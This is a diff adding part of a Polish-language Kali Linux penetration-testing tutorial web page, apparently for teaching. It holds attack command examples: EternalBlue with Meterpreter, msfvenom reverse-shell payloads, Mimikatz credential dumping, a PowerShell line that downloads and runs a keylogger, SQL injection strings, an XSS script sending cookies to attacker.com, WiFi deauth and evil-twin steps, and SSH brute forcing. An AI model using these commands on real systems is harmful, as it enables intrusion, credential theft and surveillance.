+                        <span class="terminal-output success">Service detection performed. Please report any incorrect results.</span>
+                    </div>
+                    <div class="terminal-line">
+                        <br>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-prompt">kali@scan:~#</span>
+                        <span class="terminal-command">nikto -h http://10.0.2.15 -C all | grep -E "(VULNERABLE|CRITICAL)"</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output warning">+ Apache/2.4.46 appears to be outdated (current is at least Apache/2.4.48)</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output error">+ OSVDB-3268: /config/: Directory indexing found.</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output error">+ OSVDB-3092: /admin/: This might be interesting...</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">🎪</span> Zaawansowane Techniki Skanowania</h3>
+                
+                <div class="info-box">
+                    <h4>🎯 Port Scanning Techniques</h4>
+                    <ul>
+                        <li><strong>TCP SYN Scan (-sS):</strong> Half-open scanning, stealth</li>
+                        <li><strong>TCP Connect Scan (-sT):</strong> Full TCP connection</li>
+                        <li><strong>UDP Scan (-sU):</strong> UDP port discovery</li>
+                        <li><strong>ACK Scan (-sA):</strong> Bypass firewall rules</li>
+                        <li><strong>FIN Scan (-sF):</strong> FIN flag scanning</li>
+                        <li><strong>NULL Scan (-sN):</strong> No flags set</li>
+                        <li><strong>XMAS Scan (-sX):</strong> FIN, PSH, URG flags</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <h4>🧩 Service & Version Detection</h4>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">nmap -sV --version-intensity 9 192.168.1.1</span><br>
+                        <span class="comment"># Aggressive version detection (0-9 scale)</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">nmap -sC -sV -oA full_scan 192.168.1.1</span><br>
+                        <span class="comment"># Script scan + version + output all formats</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">nmap --script=http-enum 192.168.1.100</span><br>
+                        <span class="comment"># HTTP enumeration script</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- EXPLOITATION -->
+    <section id="exploitation" style="background: rgba(233, 69, 96, 0.05);">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>💥 Faza 3: Exploitation</h2>
+                <div class="underline"></div>
+                <p>Wykorzystanie znalezionych podatności</p>
+            </div>
+
+            <div class="tools-grid fade-in">
+                <!-- Metasploit -->
+                <div class="tool-card">
+                    <div class="tool-category">Exploitation Framework</div>
+                    <h4><span class="tool-icon">💣</span> Metasploit Framework</h4>
+                    <p class="tool-description">Najbardziej zaawansowany framework do rozwoju, testowania i użycia exploitów.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">msfconsole -q</span><br>
+                        <span class="comment"># Uruchomienie Metasploit w quiet mode</span><br>
+                        <span class="comment">msf6 > search eternalblue</span><br>
+                        <span class="comment">msf6 > use exploit/windows/smb/ms17_010_eternalblue</span><br>
+                        <span class="comment">msf6 > set RHOSTS 192.168.1.100</span><br>
+                        <span class="comment">msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br>
+                        <span class="comment">msf6 > exploit</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">msfvenom</span>
+                        <span class="option-tag">meterpreter</span>
+                        <span class="option-tag">post modules</span>
+                        <span class="option-tag">auxiliary</span>
+                    </div>
+                </div>
+
+                <!-- SQLMap -->
+                <div class="tool-card">
+                    <div class="tool-category">SQL Injection</div>
+                    <h4><span class="tool-icon">🗃️</span> SQLMap</h4>
+                    <p class="tool-description">Automatyczne wykrywanie i exploitacja podatności SQL Injection.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">sqlmap -u "http://example.com/page.php?id=1" --dbs</span><br>
+                        <span class="comment"># Wykrywanie dostępnych baz danych</span><br><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">sqlmap -u "http://example.com/page.php?id=1" -D dbname --tables</span><br>
+                        <span class="comment"># Lista tabel w wybranej bazie</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">--dbs</span>
+                        <span class="option-tag">--tables</span>
+                        <span class="option-tag">--dump</span>
+                        <span class="option-tag">--os-shell</span>
+                        <span class="option-tag">--batch</span>
+                    </div>
+                </div>
+
+                <!-- Searchsploit -->
+                <div class="tool-card">
+                    <div class="tool-category">Exploit Database</div>
+                    <h4><span class="tool-icon">🔎</span> Searchsploit</h4>
+                    <p class="tool-description">Lokalna kopia Exploit-DB do szybkiego wyszukiwania exploitów.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">searchsploit apache 2.4.49</span><br>
+                        <span class="comment"># Wyszukiwanie exploitów dla Apache 2.4.49</span><br><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">searchsploit -m 49842</span><br>
+                        <span class="comment"># Kopiowanie exploita o ID 49842 do bieżącego katalogu</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">-u</span>
+                        <span class="option-tag">-w</span>
+                        <span class="option-tag">-m</span>
+                        <span class="option-tag">-p</span>
+                        <span class="option-tag">--exclude</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">🎪</span> Zaawansowane Metasploit Techniques</h3>
+                
+                <div class="info-box">
+                    <h4>🔄 Meterpreter - Najważniejsze komendy</h4>
+                    <div class="command-example">
+                        <span class="comment">meterpreter > sysinfo</span><br>
+                        <span class="comment">meterpreter > getuid</span><br>
+                        <span class="comment">meterpreter > ps</span><br>
+                        <span class="comment">meterpreter > migrate &lt;PID&gt;</span><br>
+                        <span class="comment">meterpreter > hashdump</span><br>
+                        <span class="comment">meterpreter > screenshot</span><br>
+                        <span class="comment">meterpreter > keyscan_start</span><br>
+                        <span class="comment">meterpreter > webcam_list</span><br>
+                        <span class="comment">meterpreter > shell</span><br>
+                        <span class="comment">meterpreter > background</span>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h4>🎭 Msfvenom - Tworzenie payloadów</h4>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe</span><br>
+                        <span class="comment"># Windows reverse TCP payload (EXE)</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf</span><br>
+                        <span class="comment"># Linux reverse TCP payload (ELF)</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.php</span><br>
+                        <span class="comment"># PHP reverse TCP payload</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- POST EXPLOITATION -->
+    <section id="post">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>🕵️‍♂️ Faza 4: Post-Exploitation</h2>
+                <div class="underline"></div>
+                <p>Utrzymanie dostępu, eskalacja przywilejów, ruch lateralny</p>
+            </div>
+
+            <div class="tools-grid fade-in">
+                <!-- Mimikatz -->
+                <div class="tool-card">
+                    <div class="tool-category">Credential Dumping</div>
+                    <h4><span class="tool-icon">🗝️</span> Mimikatz</h4>
+                    <p class="tool-description">Narzędzie do ekstrakcji hashy, ticketów Kerberos i credential dumping z pamięci LSASS.</p>
+                    <div class="command-example">
+                        <span class="comment">mimikatz # privilege::debug</span><br>
+                        <span class="comment">mimikatz # sekurlsa::logonpasswords</span><br>
+                        <span class="comment">mimikatz # lsadump::sam</span><br>
+                        <span class="comment">mimikatz # kerberos::ptt user.kirbi</span><br>
+                        <span class="comment">mimikatz # crypto::certificates</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">sekurlsa</span>
+                        <span class="option-tag">lsadump</span>
+                        <span class="option-tag">kerberos</span>
+                        <span class="option-tag">crypto</span>
+                    </div>
+                </div>
+
+                <!-- PowerSploit -->
+                <div class="tool-card">
+                    <div class="tool-category">PowerShell Post-Ex</div>
+                    <h4><span class="tool-icon">⚡</span> PowerSploit</h4>
+                    <p class="tool-description">Kolekcja PowerShell modules dla post-exploitation w środowiskach Windows.</p>
+                    <div class="command-example">
+                        <span class="comment">PS > IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/PowerSploit/Exfiltration/Get-Keystrokes.ps1')</span><br>
+                        <span class="comment">PS > Get-Keystrokes -LogPath C:\Windows\Temp\log.txt</span><br><br>
+                        <span class="comment">PS > Invoke-Mimikatz -DumpCreds</span><br>
+                        <span class="comment">PS > Invoke-PrivescAudit</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">Invoke-Mimikatz</span>
+                        <span class="option-tag">PowerUp</span>
+                        <span class="option-tag">Get-Keystrokes</span>
+                        <span class="option-tag">Invoke-Portscan</span>
+                    </div>
+                </div>
+
+                <!-- Empire/Starkiller -->
+                <div class="tool-card">
+                    <div class="tool-category">Post-Ex Framework</div>
+                    <h4><span class="tool-icon">🏰</span> Empire & Starkiller</h4>
+                    <p class="tool-description">Framework post-exploitation z GUI (Starkiller) do zarządzania agentami.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">powershell-empire server</span><br>
+                        <span class="comment"># Uruchomienie serwera Empire</span><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">powershell-empire client</span><br>
+                        <span class="comment"># Połączenie z konsolą Empire</span><br>
+                        <span class="comment">(Empire) > usestager windows/launcher_bat</span><br>
+                        <span class="comment">(Empire) > set Listener http</span><br>
+                        <span class="comment">(Empire) > execute</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">listeners</span>
+                        <span class="option-tag">stagers</span>
+                        <span class="option-tag">agents</span>
+                        <span class="option-tag">modules</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">🎪</span> Zaawansowane Techniki Post-Exploitation</h3>
+                
+                <div class="info-box">
+                    <h4>📊 Lateral Movement Techniques</h4>
+                    <ul>
+                        <li><strong>Pass-the-Hash:</strong> <span class="command-cell">pth-winexe -U admin%hash //target cmd</span></li>
+                        <li><strong>Pass-the-Ticket:</strong> Kerberos ticket reuse</li>
+                        <li><strong>WMI Exec:</strong> <span class="command-cell">wmic /node:target process call create "cmd.exe"</span></li>
+                        <li><strong>PSExec:</strong> <span class="command-cell">psexec.py domain/user:password@target</span></li>
+                        <li><strong>WinRM:</strong> <span class="command-cell">evil-winrm -i target -u user -p password</span></li>
+                        <li><strong>Scheduled Tasks:</strong> <span class="command-cell">schtasks /create /tn task /tr "cmd" /sc once /st time</span></li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <h4>🎭 Privilege Escalation Checklists</h4>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">linpeas.sh</span><br>
+                        <span class="comment"># Automatyczne skanowanie podatności Linux privilege escalation</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">winpeas.exe</span><br>
+                        <span class="comment"># Windows privilege escalation enumerator</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">python3 /usr/share/exploitdb/exploits/linux/local/37292.c</span><br>
+                        <span class="comment"># Dirty Cow exploit compilation</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- WEB HACKING -->
+    <section id="web" style="background: rgba(15, 52, 96, 0.1);">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>🌐 Web Application Security</h2>
+                <div class="underline"></div>
+                <p>Testy bezpieczeństwa aplikacji webowych</p>
+            </div>
+
+            <div class="tools-grid fade-in">
+                <!-- Burp Suite -->
+                <div class="tool-card">
+                    <div class="tool-category">Web Proxy</div>
+                    <h4><span class="tool-icon">🕸️</span> Burp Suite</h4>
+                    <p class="tool-description">Zaawansowana platforma do testów bezpieczeństwa aplikacji webowych.</p>
+                    <div class="command-example">
+                        <span class="comment"># Uruchomienie Burp Suite Community</span><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">burpsuite</span><br><br>
+                        <span class="comment"># Konfiguracja proxy w przeglądarce:</span><br>
+                        <span class="comment">HTTP Proxy: 127.0.0.1:8080</span><br>
+                        <span class="comment">Zainstaluj certyfikat CA z http://burp</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">Proxy</span>
+                        <span class="option-tag">Intruder</span>
+                        <span class="option-tag">Repeater</span>
+                        <span class="option-tag">Scanner</span>
+                        <span class="option-tag">Extender</span>
+                    </div>
+                </div>
+
+                <!-- OWASP ZAP -->
+                <div class="tool-card">
+                    <div class="tool-category">Web App Scanner</div>
+                    <h4><span class="tool-icon">🛡️</span> OWASP ZAP</h4>
+                    <p class="tool-description">Zed Attack Proxy - darmowy, open-source skaner bezpieczeństwa aplikacji webowych.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">zaproxy</span><br>
+                        <span class="comment"># GUI mode</span><br><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">zap.sh -daemon -port 8080 -host 0.0.0.0 -config api.disablekey=true</span><br>
+                        <span class="comment"># Daemon mode z API</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">-daemon</span>
+                        <span class="option-tag">-port</span>
+                        <span class="option-tag">-config</span>
+                        <span class="option-tag">-host</span>
+                    </div>
+                </div>
+
+                <!-- Commix -->
+                <div class="tool-card">
+                    <div class="tool-category">Command Injection</div>
+                    <h4><span class="tool-icon">🎯</span> Commix</h4>
+                    <p class="tool-description">Automatyczne wykrywanie i exploitacja podatności Command Injection.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">commix -u "http://example.com/vuln.php?addr=127.0.0.1"</span><br>
+                        <span class="comment"># Podstawowe użycie</span><br><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">commix -u "http://example.com/vuln.php" --data="addr=127.0.0.1" --os-cmd="whoami"</span><br>
+                        <span class="comment"># Wykonanie polecenia systemowego</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">--data</span>
+                        <span class="option-tag">--os-cmd</span>
+                        <span class="option-tag">--os-shell</span>
+                        <span class="option-tag">--batch</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">🎪</span> Zaawansowane Web Hacking Techniques</h3>
+                
+                <div class="info-box">
+                    <h4>🎯 SQL Injection - Manual Techniques</h4>
+                    <div class="command-example">
+                        <span class="comment"># Detection:</span><br>
+                        <span class="command">' OR '1'='1</span><br>
+                        <span class="command">" OR "1"="1</span><br>
+                        <span class="command">' UNION SELECT null,null--</span><br><br>
+                        
+                        <span class="comment"># Enumeration:</span><br>
+                        <span class="command">' UNION SELECT version(),user()--</span><br>
+                        <span class="command">' UNION SELECT table_name,null FROM information_schema.tables--</span><br>
+                        <span class="command">' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--</span><br>
+                        <span class="command">' UNION SELECT username,password FROM users--</span>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h4>🎭 XSS & CSRF Payloads</h4>
+                    <div class="command-example">
+                        <span class="comment"># Basic XSS:</span><br>
+                        <span class="command">&lt;script&gt;alert('XSS')&lt;/script&gt;</span><br>
+                        <span class="command">&lt;img src=x onerror=alert('XSS')&gt;</span><br><br>
+                        
+                        <span class="comment"># Stealing Cookies:</span><br>
+                        <span class="command">&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</span><br><br>
+                        
+                        <span class="comment"># CSRF PoC:</span><br>
+                        <span class="command">&lt;form action="http://bank.com/transfer" method="POST"&gt;</span><br>
+                        <span class="command">&lt;input type="hidden" name="amount" value="1000"&gt;</span><br>
+                        <span class="command">&lt;input type="hidden" name="to" value="attacker"&gt;</span><br>
+                        <span class="command">&lt;/form&gt;</span><br>
+                        <span class="command">&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- WIRELESS -->
+    <section id="wireless">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>📶 Wireless Security Testing</h2>
+                <div class="underline"></div>
+                <p>Testy bezpieczeństwa sieci bezprzewodowych</p>
+            </div>
+
+            <div class="tools-grid fade-in">
+                <!-- Aircrack-ng -->
+                <div class="tool-card">
+                    <div class="tool-category">WiFi Cracking</div>
+                    <h4><span class="tool-icon">📡</span> Aircrack-ng Suite</h4>
+                    <p class="tool-description">Kompletny zestaw narzędzi do audytu bezpieczeństwa sieci WiFi.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">airmon-ng start wlan0</span><br>
+                        <span class="comment"># Przełączenie karty w tryb monitorowania</span><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">airodump-ng wlan0mon</span><br>
+                        <span class="comment"># Monitorowanie sieci WiFi</span><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">aireplay-ng -0 10 -a BSSID -c CLIENT wlan0mon</span><br>
+                        <span class="comment"># Deauthentication attack</span><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">aircrack-ng -w wordlist.txt capture.cap</span><br>
+                        <span class="comment"># Łamanie hasła WPA/WPA2</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">airmon-ng</span>
+                        <span class="option-tag">airodump-ng</span>
+                        <span class="option-tag">aireplay-ng</span>
+                        <span class="option-tag">aircrack-ng</span>
+                    </div>
+                </div>
+
+                <!-- Wifite -->
+                <div class="tool-card">
+                    <div class="tool-category">Automated WiFi Attack</div>
+                    <h4><span class="tool-icon">🤖</span> Wifite</h4>
+                    <p class="tool-description">Zautomatyzowane narzędzie do ataków na sieci WiFi z graficznym interfejsem.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">wifite</span><br>
+                        <span class="comment"># Automatyczne skanowanie i atakowanie sieci</span><br><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">wifite --kill</span><br>
+                        <span class="comment"># Zabicie procesów zakłócających</span><br><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">wifite -i wlan0 --dict /usr/share/wordlists/rockyou.txt</span><br>
+                        <span class="comment"># Użycie własnej karty i słownika</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">-i</span>
+                        <span class="option-tag">--dict</span>
+                        <span class="option-tag">--kill</span>
+                        <span class="option-tag">--wpa</span>
+                    </div>
+                </div>
+
+                <!-- Fern WiFi Cracker -->
+                <div class="tool-card">
+                    <div class="tool-category">GUI WiFi Tool</div>
+                    <h4><span class="tool-icon">🌿</span> Fern WiFi Cracker</h4>
+                    <p class="tool-description">Graficzne narzędzie do testów bezpieczeństwa WiFi z automatycznymi atakami.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">fern-wifi-cracker</span><br>
+                        <span class="comment"># Uruchomienie GUI</span><br><br>
+                        <span class="comment"># Funkcje:</span><br>
+                        <span class="comment">1. Automatyczne wykrywanie sieci</span><br>
+                        <span class="comment">2. WEP/WPA/WPA2 cracking</span><br>
+                        <span class="comment">3. Session hijacking</span><br>
+                        <span class="comment">4. Access point creation</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">WEP</span>
+                        <span class="option-tag">WPA</span>
+                        <span class="option-tag">WPS</span>
+                        <span class="option-tag">Evil Twin</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">🎪</span> Zaawansowane Techniki Wireless</h3>
+                
+                <div class="info-box">
+                    <h4>🔓 WPA/WPA2 Cracking Workflow</h4>
+                    <ol>
+                        <li><strong>Monitor Mode:</strong> <span class="command-cell">airmon-ng start wlan0</span></li>
+                        <li><strong>Network Discovery:</strong> <span class="command-cell">airodump-ng wlan0mon</span></li>
+                        <li><strong>Capture Handshake:</strong> <span class="command-cell">airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon</span></li>
+                        <li><strong>Deauth Attack:</strong> <span class="command-cell">aireplay-ng -0 10 -a BSSID -c CLIENT wlan0mon</span></li>
+                        <li><strong>Crack Password:</strong> <span class="command-cell">aircrack-ng -w rockyou.txt capture-01.cap</span></li>
+                        <li><strong>Hashcat (GPU):</strong> <span class="command-cell">hashcat -m 2500 capture.hccapx rockyou.txt</span></li>
+                    </ol>
+                </div>
+
+                <div class="success-box">
+                    <h4>🎭 Evil Twin & MITM Attacks</h4>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">airbase-ng -a BSSID --essid "Free WiFi" -c 6 wlan0mon</span><br>
+                        <span class="comment"># Utworzenie złośliwego access pointu</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">ettercap -T -q -i wlan0 -M arp:remote /192.168.1.1// /192.168.1.100//</span><br>
+                        <span class="comment"># ARP spoofing pomiędzy routerem a ofiarą</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">sslstrip -l 8080</span><br>
+                        <span class="comment"># SSL stripping attack</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FORENSICS -->
+    <section id="forensics" style="background: rgba(15, 52, 96, 0.1);">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>🔬 Digital Forensics & Reverse Engineering</h2>
+                <div class="underline"></div>
+                <p>Analiza forenzyczna i reverse engineering</p>
+            </div>
+
+            <div class="tools-grid fade-in">
+                <!-- Autopsy -->
+                <div class="tool-card">
+                    <div class="tool-category">Digital Forensics</div>
+                    <h4><span class="tool-icon">🕵️</span> Autopsy</h4>
+                    <p class="tool-description">Graficzne narzędzie do cyfrowej analizy forenzycznej z supportem dla wielu formatów.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">autopsy</span><br>
+                        <span class="comment"># Uruchomienie GUI na localhost:9999</span><br><br>
+                        <span class="comment"># Funkcje:</span><br>
+                        <span class="comment">• Timeline analysis</span><br>
+                        <span class="comment">• Keyword search</span><br>
+                        <span class="comment">• File carving</span><br>
+                        <span class="comment">• Registry analysis</span><br>
+                        <span class="comment">• Web artifact parsing</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">timeline</span>
+                        <span class="option-tag">carving</span>
+                        <span class="option-tag">hashing</span>
+                        <span class="option-tag">registry</span>
+                    </div>
+                </div>
+
+                <!-- Ghidra -->
+                <div class="tool-card">
+                    <div class="tool-category">Reverse Engineering</div>
+                    <h4><span class="tool-icon">🧩</span> Ghidra</h4>
+                    <p class="tool-description">Zaawansowane narzędzie do reverse engineering stworzone przez NSA.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">ghidra</span><br>
+                        <span class="comment"># Uruchomienie GUI</span><br><br>
+                        <span class="comment"># Workflow:</span><br>
+                        <span class="comment">1. Create new project</span><br>
+                        <span class="comment">2. Import binary file</span><br>
+                        <span class="comment">3. Auto-analysis</span><br>
+                        <span class="comment">4. Manual analysis with decompiler</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">decompiler</span>
+                        <span class="option-tag">disassembler</span>
+                        <span class="option-tag">scripting</span>
+                        <span class="option-tag">plugins</span>
+                    </div>
+                </div>
+
+                <!-- Volatility -->
+                <div class="tool-card">
+                    <div class="tool-category">Memory Forensics</div>
+                    <h4><span class="tool-icon">💾</span> Volatility Framework</h4>
+                    <p class="tool-description">Zaawansowane narzędzie do analizy pamięci RAM (memory forensics).</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">volatility -f memory.dmp imageinfo</span><br>
+                        <span class="comment"># Identyfikacja profilu systemu</span><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">volatility -f memory.dmp --profile=Win10x64 pslist</span><br>
+                        <span class="comment"># Lista procesów</span><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">volatility -f memory.dmp --profile=Win10x64 hashdump</span><br>
+                        <span class="comment"># Dump password hashes z pamięci</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">imageinfo</span>
+                        <span class="option-tag">pslist</span>
+                        <span class="option-tag">hashdump</span>
+                        <span class="option-tag">netscan</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- WORKFLOW -->
+            <div class="section-title fade-in" style="margin-top: 60px;">
+                <h2>📊 Workflow Penetration Testing</h2>
+                <div class="underline"></div>
+                <p>Strukturowany proces testów penetracyjnych</p>
+            </div>
+
+            <div class="workflow-steps fade-in">
+                <div class="workflow-step" data-step="1">
+                    <h4>1. Planning & Recon</h4>
+                    <p>Definiowanie zakresu, OSINT, passive reconnaissance</p>
+                </div>
+                <div class="workflow-step" data-step="2">
+                    <h4>2. Scanning</h4>
+                    <p>Network discovery, port scanning, service enumeration</p>
+                </div>
+                <div class="workflow-step" data-step="3">
+                    <h4>3. Vulnerability Analysis</h4>
+                    <p>Identification of weaknesses and misconfigurations</p>
+                </div>
+                <div class="workflow-step" data-step="4">
+                    <h4>4. Exploitation</h4>
+                    <p>Gaining initial access using vulnerabilities</p>
+                </div>
+                <div class="workflow-step" data-step="5">
+                    <h4>5. Post-Exploitation</h4>
+                    <p>Privilege escalation, lateral movement, persistence</p>
+                </div>
+                <div class="workflow-step" data-step="6">
+                    <h4>6. Reporting</h4>
+                    <p>Documentation of findings, recommendations, proof of concept</p>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">📋</span> Kali Linux Cheat Sheets</h3>
+                
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Category</th>
+                                <th>Tool</th>
+                                <th>Common Command</th>
+                                <th>Purpose</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Network Scanning</td>
+                                <td>Nmap</td>
+                                <td class="command-cell">nmap -A -T4 target</td>
+                                <td>Agressive scan with OS/version detection</td>
+                            </tr>
+                            <tr>
+                                <td>Web App Testing</td>
+                                <td>Burp Suite</td>
+                                <td class="command-cell">Configure proxy: 8080</td>
+                                <td>Intercept and modify HTTP traffic</td>
+                            </tr>
+                            <tr>
+                                <td>Password Cracking</td>
+                                <td>John the Ripper</td>
+                                <td class="command-cell">john --wordlist=rockyou.txt hash.txt</td>
+                                <td>Dictionary attack on password hashes</td>
+                            </tr>
+                            <tr>
+                                <td>WiFi Testing</td>
+                                <td>Aircrack-ng</td>
+                                <td class="command-cell">aircrack-ng -w dict.cap capture.cap</td>
+                                <td>Crack WPA/WPA2 handshake</td>
+                            </tr>
+                            <tr>
+                                <td>SQL Injection</td>
+                                <td>SQLMap</td>
+                                <td class="command-cell">sqlmap -u "url" --dbs</td>
+                                <td>Automated SQL injection testing</td>
+                            </tr>
+                            <tr>
+                                <td>Exploitation</td>
+                                <td>Metasploit</td>
+                                <td class="command-cell">msfconsole, use exploit/...</td>
+                                <td>Framework for developing/using exploits</td>
+                            </tr>
+                            <tr>
+                                <td>Sniffing</td>
+                                <td>Wireshark</td>
+                                <td class="command-cell">wireshark -i eth0</td>
+                                <td>Network protocol analyzer</td>
+                            </tr>
+                            <tr>
+                                <td>Forensics</td>
+                                <td>Autopsy</td>
+                                <td class="command-cell">autopsy (port 9999)</td>
+                                <td>Digital forensics platform</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- INTERAKTYWNY TERMINAL -->
+    <section id="terminal">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>💻 Interaktywny Terminal Kali</h2>
+                <div class="underline"></div>
+                <p>Symulacja środowiska Kali Linux z przykładowymi komendami</p>
+            </div>
+
+            <div class="lab-container fade-in">
+                <div class="lab-header">
+                    <h3>Kali Linux Terminal Simulator</h3>
+                    <div class="lab-controls">
+                        <button class="lab-btn" onclick="runCommand('nmap')">Nmap Scan</button>
+                        <button class="lab-btn" onclick="runCommand('dirb')">Directory Bruteforce</button>
+                        <button class="lab-btn" onclick="runCommand('sqlmap')">SQL Injection Test</button>
+                        <button class="lab-btn primary" onclick="clearTerminal()">Clear</button>
+                    </div>
+                </div>
+                
+                <div class="terminal-container">
+                    <div class="terminal-header">
+                        <div class="terminal-dots">
+                            <div class="dot red"></div>
+                            <div class="dot yellow"></div>
+                            <div class="dot green"></div>
+                        </div>
+                        <div class="terminal-title">kali@interactive:~ (Live Terminal)</div>
+                    </div>
+                    <div class="terminal-content" id="interactiveTerminal">
+                        <div class="terminal-line">
+                            <span class="terminal-prompt">kali@interactive:~#</span>
+                            <span class="terminal-command" id="currentCommand"></span>
+                        </div>
+                        <div id="commandOutput"></div>
+                        <div class="terminal-line">
+                            <span class="terminal-prompt">kali@interactive:~#</span>
+                            <span class="terminal-cursor">█</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap;">
+                    <button class="lab-btn" onclick="addCommand('nmap -sV -sC 192.168.1.1')">Basic Nmap</button>
+                    <button class="lab-btn" onclick="addCommand('dirb http://target.com /usr/share/wordlists/dirb/common.txt')">Dirb Scan</button>
+                    <button class="lab-btn" onclick="addCommand('sqlmap -u \"http://target.com?id=1\" --dbs')">SQLMap DB Enum</button>
+                    <button class="lab-btn" onclick="addCommand('hydra -l admin -P rockyou.txt ssh://192.168.1.1')">SSH Brute Force</button>
+                    <button class="lab-btn" onclick="addCommand('airmon-ng start wlan0')">WiFi Monitor Mode</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
